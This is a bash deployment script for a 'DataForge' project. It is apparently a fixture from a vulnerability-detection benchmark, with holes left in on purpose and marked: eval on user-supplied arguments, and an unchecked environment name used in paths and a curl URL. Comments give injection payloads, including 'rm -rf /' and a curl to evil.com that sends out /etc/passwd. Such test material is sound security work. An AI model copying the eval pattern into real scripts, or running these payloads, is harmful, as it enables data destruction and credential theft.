#!/bin/bash
#
# DataForge Deployment Script
#
# COMMAND INJECTION SINK: Arguments from Python subprocess reach this script
# TAINT FLOW: Python shell_runner.py -> subprocess.run() -> this script -> shell commands
#

set -e

# ============================================================================
# COMMAND INJECTION VULNERABILITY
# ============================================================================
# $1 (environment) comes from user input via Python shell_runner.py
# An attacker could inject: "production; rm -rf /"
# ============================================================================

ENVIRONMENT=$1  # TAINTED: User-controlled from Python
EXTRA_ARGS=$2   # TAINTED: Additional arguments

# Configuration
DEPLOY_DIR="/opt/dataforge"
LOG_FILE="/var/log/dataforge/deploy.log"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

echo "=== DataForge Deployment ===" | tee -a "$LOG_FILE"
echo "Environment: $ENVIRONMENT" | tee -a "$LOG_FILE"
echo "Timestamp: $TIMESTAMP" | tee -a "$LOG_FILE"

# Validate environment (weak validation)
if [ -z "$ENVIRONMENT" ]; then
    echo "ERROR: Environment not specified" | tee -a "$LOG_FILE"
    exit 1
fi

# COMMAND INJECTION: Environment variable used directly in shell commands
# If ENVIRONMENT contains shell metacharacters, they will be executed

echo "Deploying to $ENVIRONMENT environment..." | tee -a "$LOG_FILE"

# SINK: $ENVIRONMENT interpolated into shell command
# An attacker could set ENVIRONMENT to: "prod; curl evil.com/steal?data=$(cat /etc/passwd)"
docker-compose -f "docker/docker-compose.yml" --env-file ".env.$ENVIRONMENT" up -d

# Another SINK: Environment in directory path
# Attacker: ENVIRONMENT="../../../etc" could cause issues
mkdir -p "$DEPLOY_DIR/releases/$ENVIRONMENT/$TIMESTAMP"

# Copy artifacts
# SINK: User-controlled path in cp command
cp -r dist/* "$DEPLOY_DIR/releases/$ENVIRONMENT/$TIMESTAMP/"

# Create symlink for current release
ln -sfn "$DEPLOY_DIR/releases/$ENVIRONMENT/$TIMESTAMP" "$DEPLOY_DIR/current"

# SINK: Extra arguments passed directly to shell
# EXTRA_ARGS could contain: "--force; malicious_command"
# vuln-code-snippet start dfg_deploy_eval_extra_args
if [ -n "$EXTRA_ARGS" ]; then
    echo "Applying extra configuration: $EXTRA_ARGS" | tee -a "$LOG_FILE"
    # COMMAND INJECTION: Extra args executed directly
    eval "$EXTRA_ARGS"  # DANGEROUS: eval with user input  # vuln-code-snippet vuln-line dfg_deploy_eval_extra_args
fi
# vuln-code-snippet end dfg_deploy_eval_extra_args

# Run post-deploy hooks
echo "Running post-deploy hooks for $ENVIRONMENT..." | tee -a "$LOG_FILE"

# vuln-code-snippet start dfg_deploy_url_injection
# SINK: Environment used in curl URL
# Attacker could set ENVIRONMENT to: "prod?leak=$(cat /etc/passwd)&x"
curl -X POST "http://hooks.dataforge.internal/deploy/$ENVIRONMENT" \
    -H "Content-Type: application/json" \
    -d "{\"environment\": \"$ENVIRONMENT\", \"timestamp\": \"$TIMESTAMP\"}"  # vuln-code-snippet vuln-line dfg_deploy_url_injection
# vuln-code-snippet end dfg_deploy_url_injection

# Notify Slack (if configured)
if [ -n "$SLACK_WEBHOOK_URL" ]; then
    curl -X POST "$SLACK_WEBHOOK_URL" \
        -H "Content-Type: application/json" \
        -d "{\"text\": \"Deployed to $ENVIRONMENT at $TIMESTAMP\"}"
fi

echo "=== Deployment Complete ===" | tee -a "$LOG_FILE"
exit 0
